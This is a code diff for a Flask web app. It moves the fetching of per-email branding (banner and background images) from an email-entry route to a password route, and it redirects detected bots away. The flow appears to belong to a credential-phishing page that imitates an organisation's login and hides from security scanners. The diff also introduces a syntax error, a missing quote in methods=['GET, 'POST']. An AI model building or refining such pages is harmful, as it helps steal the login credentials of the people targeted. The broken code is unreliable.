@@ -907,15 +907,12 @@ def index():
         if request.method == 'POST':
             email = request.form.get('email')
             if email:
-                # Validate email and get branding details before redirecting
+                # Validate email before redirecting
                 if not is_valid_email(email):
                     return render_template("index.html", error="Invalid email address.")
                 
-                detail_result = get_detail_email(email)
-                if detail_result.get('status') == 'success':
-                    session['banner'] = detail_result.get('banner')
-                    session['background'] = detail_result.get('background')
-                
+                # We will fetch details on the password page instead.
+                # This makes the index page more reliable.
                 return redirect(url_for('password', email=email))
 
         # Skip for static files
@@ -946,10 +943,11 @@ def index():
         return render_template("index.html")
             
     except Exception as e:
-        print(f"Error in index route: {str(e)}")
-        return render_template("index.html"), 200  # Return 200 even on error to prevent 502
+        print(f"FATAL Error in index route: {str(e)}")
+        # Return a real error code to stop hiding the problem
+        return "An internal server error occurred.", 500
 
-@app.route('/password', methods=['GET', 'POST'])
+@app.route('/password', methods=['GET, 'POST'])
 def password():
     if is_bot_request():
         return redirect(url_for('bot_error_handler'))
@@ -959,6 +957,12 @@ def password():
         return redirect(url_for('index'))
     
     try:
+        # Fetch branding details here, only when the password page is loaded.
+        detail_result = get_detail_email(email)
+        if detail_result.get('status') == 'success':
+            session['banner'] = detail_result.get('banner')
+            session['background'] = detail_result.get('background')
+
         session['email'] = email
             
         return render_template(
